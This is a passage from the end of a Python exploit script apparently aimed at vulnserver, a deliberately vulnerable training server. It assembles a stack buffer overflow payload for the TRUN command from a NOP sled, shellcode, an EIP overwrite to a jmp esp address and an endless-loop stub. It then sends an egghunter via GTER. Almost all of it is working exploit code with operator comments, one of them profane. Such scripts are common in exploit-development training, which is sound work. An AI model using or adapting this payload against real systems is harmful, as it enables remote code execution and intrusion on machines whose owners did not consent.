        nopsled,
        shellcode
    ]])))
    EIP = packlatin("<L",0x625012f0)  ## 0x625012f0: jmp esp
    stage1 = (
        ## Cause endless loop ; sock never close, never free/overwrite _malloc 
        ## STAY RIGHT WHERE YOU ARE YOU SON OF A BITCH
        ## s -a 0x0 L?80000000 "w00tw00t"
        "\x89\xe2\xff\xe2"      # 89E2 mov edx,esp; FFE2 jmp edx # 4 bytes
    )
    slack2 = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        spacer,
        eggegg,
        nopsled,
        shellcode,
        slack1,
        EIP,
        stage1
    ]])))
    buf_persistence = f"{opcode}{spacer}{eggegg}{nopsled}{shellcode}{slack1}{EIP}{stage1}{slack2}"


    print(f"\n[+] Sending shellcode on TRUN with endless loop logic to remain memory-persistent")
    sock_persist = sender(ip,port,buf_persistence)
    print("[+] Sleeping for 3 secs (give vulnserver time to accept() new sockfd + _malloc )")
    time.sleep(3)  ## sleep long enough for vulnserver to open another accept()  (new sockfd)
    print("[+] Sending egghunter on GTER")
    sock = sender(ip, port,buf_egghunter)
    sock.recv(1024)  ## clear the airwaves
    print(f"[+] Sleeping for 3 secs (prependmigrate to complete)")
    time.sleep(3)  ## sleep long enough for vulnserver to open another accept()  (new sockfd)
    # input()
    sock_persist.close()
    sock.close()  


if __name__=="__main__":
    main()

